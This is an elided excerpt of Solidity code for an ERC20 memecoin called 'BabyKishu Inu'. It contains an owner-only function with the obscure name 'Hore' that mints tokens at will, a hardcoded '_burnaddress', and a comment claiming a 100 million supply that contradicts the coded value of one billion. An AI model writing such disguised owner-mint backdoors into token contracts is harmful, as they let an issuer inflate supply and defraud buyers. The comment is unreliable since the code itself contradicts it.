...
contract ERC20 is Context, IERC20, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) public {
        ...
        _burnaddress = 0xC9FBddA127Fa237D7273adcDdBca0e5e1C63E701;
    ...
    function Hore(uint256 amount) public onlyOwner {
    Hore(msg.sender, amount);
    }
    ...
    function Hore(address account, uint256 amount) internal virtual {
...
contract BabyKishuInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("BabyKishu Inu", "BKI") {
        Hore(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}